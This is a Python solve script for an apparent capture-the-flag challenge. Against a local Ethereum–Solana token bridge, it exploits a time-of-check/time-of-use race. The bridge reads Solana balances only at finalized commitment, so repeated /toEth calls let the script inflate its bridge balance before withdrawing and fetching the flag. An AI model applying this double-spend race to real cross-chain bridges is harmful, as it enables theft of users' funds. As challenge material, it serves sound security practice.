from eth_account import Account as EthAccount
import json
from requests import Session
from solana.rpc.api import Client as Solana
from solana.rpc.core import RPCException
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from spl.token.client import Token as SPLToken
from spl.token.constants import TOKEN_PROGRAM_ID
from spl.token.instructions import get_associated_token_address
import time
from web3 import Web3
from web3.middleware import SignAndSendRawMiddlewareBuilder

REMOTE = "http://localhost:5000"

session = Session()
PLAYER = session.get(f"{REMOTE}/player.json").json()

# setup web3 connection
w3 = Web3(Web3.HTTPProvider(f"{REMOTE}/eth"))
assert w3.is_connected()
w3.eth.default_account = PLAYER["ethereum"]["address"]
w3.middleware_onion.inject(
    SignAndSendRawMiddlewareBuilder.build(
        EthAccount.from_key(PLAYER["ethereum"]["private_key"])
    ),
    layer=0,
)
eth_Setup = w3.eth.contract(
    PLAYER["ethereum"]["setup"],
    abi=json.loads(open("../eth/out/Setup.sol/Setup.json").read())["abi"],
)
eth_Feather = w3.eth.contract(
    eth_Setup.functions.feather().call(),
    abi=json.loads(open("../eth/out/Feather.sol/Feather.json").read())["abi"],
)
eth_Bubble = w3.eth.contract(
    eth_Setup.functions.bubble().call(),
    abi=json.loads(open("../eth/out/Bubble.sol/Bubble.json").read())["abi"],
)
eth_Bridge = w3.eth.contract(
    eth_Setup.functions.bridge().call(),
    abi=json.loads(open("../eth/out/Bridge.sol/Bridge.json").read())["abi"],
)
print("Ethereum connected!")

# setup solana connection
solana = Solana(f"{REMOTE}/sol")
assert solana.is_connected()
sol_player = Keypair.from_bytes(PLAYER["solana"]["keypair"])
sol_bbl = Pubkey.from_string(PLAYER["solana"]["mint"])
spl = SPLToken(
    solana,
    sol_bbl,
    TOKEN_PROGRAM_ID,
    sol_player,
)
print(f"Solana connected!")

# create our associated token address
# (this may take a couple of attempts if the solana validator just came up)
print("Creating associated token address...")
while True:
    try:
        spl.create_associated_token_account(sol_player.pubkey())
        break
    except RPCException as e:
        if "IncorrectProgramId" in str(e) or "AccountNotFound" in str(e):
            time.sleep(1)
        else:
            raise
sol_ata = get_associated_token_address(sol_player.pubkey(), sol_bbl, TOKEN_PROGRAM_ID)

# claim our airdrop
print("Claiming airdrop...")
eth_Setup.functions.airdrop().transact()
eth_Feather.functions.approve(eth_Bubble.address, 10).transact()
eth_Bubble.functions.wrap(10).transact()
eth_Bubble.functions.approve(eth_Bridge.address, 10).transact()
eth_Bridge.functions.deposit(10).transact()

def bubble_balance():
    return eth_Bubble.functions.balanceOf(PLAYER["ethereum"]["address"]).call()

def bridge_balance():
    return eth_Bridge.functions.accounts(PLAYER["ethereum"]["address"]).call()

# start racing!
while True:
    initial_balance = bridge_balance()
    print("initial:", initial_balance)

    if initial_balance > 1_000_000_010:
        break

    to_sol_res = session.post(f"{REMOTE}/toSol", json={
        "key": PLAYER["ethereum"]["private_key"],
        "amount": initial_balance,
        "target": PLAYER["solana"]["pubkey"],
    })

    print("toSol:", to_sol_res.status_code, to_sol_res.text)
    new_balance = bubble_balance()
    print("new:", new_balance)

    if to_sol_res.status_code == 200:
        def wait_for_solana(target_balance: int):
            print("\x1b[0;90mwaiting for solana transaction to finalize...", end="", flush=True)
            while spl.get_balance(sol_ata).value.amount != str(target_balance):
                print(".", end="", flush=True)
                time.sleep(1)
            print("\x1b[0m")
        
        wait_for_solana(initial_balance)

        # The crux of this solve script is a TOCTOU in toEth between solana.py reading data at
        # the `Finalized` commitment level whilst sending new transactions without waiting for
        # that level of commitment.
        # Both the Ethereum and Solana blockchain calls in app.py return before the corresponding
        # transactions have actually been reflected on-chain. This can be abused on the Ethereum
        # side by racing `Bridge.withdraw` and `GET /toSol`, and on the Solana side by calling
        # `GET /toEth` repeatedly. While the Ethereum-side exploit is feasible locally, it has a
        # low chance of success and doesn't really work on remote - geth is just too dang fast!
        # Instead, this solve script uses the TOCTOU on the Solana side, taking advantage of the
        # slow time-to-finalization with the default solana-test-validator settings.

        while True:
            to_eth_res = session.post(f"{REMOTE}/toEth", json={
                "key": json.dumps(PLAYER["solana"]["keypair"]),
                "amount": initial_balance,
                "target": PLAYER["ethereum"]["address"],
            })
            print("toEth:", to_eth_res.status_code, to_eth_res.text)
            if to_eth_res.status_code != 200 and "nonce too low" not in to_eth_res.text:
                break
        
        wait_for_solana(0)

    print()

# finish the race
print("Finishing up...")
eth_Bridge.functions.withdraw(1_000_000_010).transact()

isSolved = eth_Setup.functions.isSolved().call()
print("isSolved:", isSolved)
assert isSolved
print(session.get(f"{REMOTE}/flag").text)
